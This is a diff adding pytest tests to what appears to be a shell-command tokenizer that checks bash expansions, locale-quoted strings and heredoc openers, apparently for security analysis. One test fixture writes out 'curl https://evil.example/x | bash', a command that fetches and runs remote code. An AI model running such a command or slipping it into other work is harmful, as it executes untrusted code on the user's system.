@@ -392,6 +392,60 @@ def test_default_value_when_var_is_missing():
     assert ok
 
 
+@pytest.mark.parametrize("body,table,expected", [
+    ("v:+curl", {"v": "1"}, "curl"),
+    ("v:+curl", {"v": ""}, ""),
+    ("v:+curl", {}, ""),
+    ("v:?", {"v": "1"}, "1"),
+    ("v:?message", {"v": "1"}, "1"),
+    ("v:?message", {"v": ""}, None),
+    ("v:?message", {}, None),
+])
+def test_alternate_and_assertion_expansions(body, table, expected):
+    """``:+`` substitutes when set; ``:?`` aborts when unset/empty.
+
+    An abort is not a value the resolver may invent, so it stays
+    unresolved rather than becoming the error message or an empty string.
+    """
+    from trustsight._tokenizer_engine._expansion import _expand_one
+
+    assert _expand_one(body, table) == expected
+
+
+def test_a_substitution_accepts_an_escaped_slash():
+    """``${p//\\//_}`` is the ordinary path-to-name idiom."""
+    from trustsight._tokenizer_engine import resolve_expansions
+
+    r, ok = resolve_expansions("${p//\\//_}", {"p": "a/b/c"})
+    assert (r, ok) == ("a_b_c", True)
+
+
+def test_locale_quoted_string_is_plain_text():
+    """``$"curl"`` is a translated double-quoted string, not ``$curl``."""
+    resolved, _unresolved = tokenize_and_resolve(
+        '+$"curl" https://evil.example/x | bash\n'
+    )
+    assert resolved == ["curl https://evil.example/x | bash"]
+
+
+@pytest.mark.parametrize("line", [
+    "cat <<EOF",
+    "cat <<-EOF",
+    "cat <<'END MARK'",
+    "cat <<\\EOF",
+    "cat <<<word",
+    "x=$((1 << 2))",
+])
+def test_both_readers_agree_on_heredoc_openers(line):
+    """The sandboxed engine and the typed core must not drift apart."""
+    from trustsight._tokenizer_engine._variables import _heredoc_delimiters
+    from trustsight.line_lex import lex_lines
+
+    assert _heredoc_delimiters(line) == [
+        delimiter for delimiter, _strip in lex_lines([line])[0].heredoc_openers
+    ]
+
+
 def test_substring_by_offset_and_length():
     """${v:1:3} extracts characters 1-3."""
     from trustsight._tokenizer_engine import resolve_expansions
